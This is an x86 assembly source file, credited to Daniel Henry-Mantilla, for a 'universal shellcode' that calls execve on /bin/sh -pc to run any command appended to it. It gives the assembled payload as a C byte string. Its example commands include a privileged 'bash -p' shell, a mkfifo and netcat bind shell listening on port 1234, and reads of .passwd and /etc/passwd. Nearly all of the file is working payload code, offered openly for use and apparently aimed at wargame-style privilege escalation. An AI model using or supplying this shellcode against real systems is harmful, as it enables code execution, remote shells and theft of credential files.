	#	Assembly code to invoke a custom command (x86)	#
	#	a.k.a. "Universal shellcode"			#
	#	(by Daniel Henry-Mantilla)			#

# char shellcode[] =
#  "\x31\xc0\xb0\x0b\xbb\xd3\x8f\x9c\xff\xf7\xdb\x53\x89\xe3\x99\x52\xeb\x20\x8b\x34\x24\x46\x80\x3e\x23\x75\xfa\x88\x16\x53\x8d\x5c\x24\xf0\x53\x89\xe1\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\xcd\x80\xe8\xdb\xff\xff\xff"\
#  "custom_cmd"\
#  "#"; // Terminator (required /!\)

# custom_cmd examples:
# 1: "echo 'Shell spawned successfully!' && bash -p"\
# 2: "rm -f /tmp/f && mkfifo /tmp/f && cat /tmp/f | /bin/sh -p -i 2>&1 | nc -lp 1234 > /tmp/f; rm -f /tmp/f"\
# 3: "cat .passwd"\
# 4: "cat /etc/passwd && /etc/shallow"\

# Total length of the shellcode = 56 + custom_cmd_length
# Since 56 = 55 (prefix_length) + 1 (terminating char)

	.set END, 0x23		# terminating char (e.g, '#')
.text
.globl _start
_start:
	xorl %eax, %eax
	movb $0xb, %al		# sys_execve

	mov $0xff9c8fd3, %ebx
	neg %ebx		# '-pc'
	pushl %ebx
	movl %esp, %ebx		# address of "-pc"

	cdq			# env = %edx = NULL
	pushl %edx		# NULL terminator of argv[]

	jmp cmd
	back:
	movl (%esp), %esi	# address of custom cmd

#	jmp test		# Uncomment to handle empty commands
	loop:
	inc %esi
	test:
	cmpb $END, (%esi)
	jne loop
	movb %dl, (%esi)	# Custom cmd is now '\0'-terminated

	pushl %ebx		# address of "-pc"

	lea -0x10(%esp), %ebx	# address of "/bin/sh"
	pushl %ebx
	movl %esp, %ecx		# argv

	pushl %edx		# "" (null-terminator)
	pushl $0x68732f2f	# '//sh'
	pushl $0x6e69622f	# '/bin'

	int $0x80
cmd:
	call back
	# Custom command here #
	.ascii "echo 'Shell spawned successfully!' && bash -p"
	.ascii "#"		# /!\ String terminator #


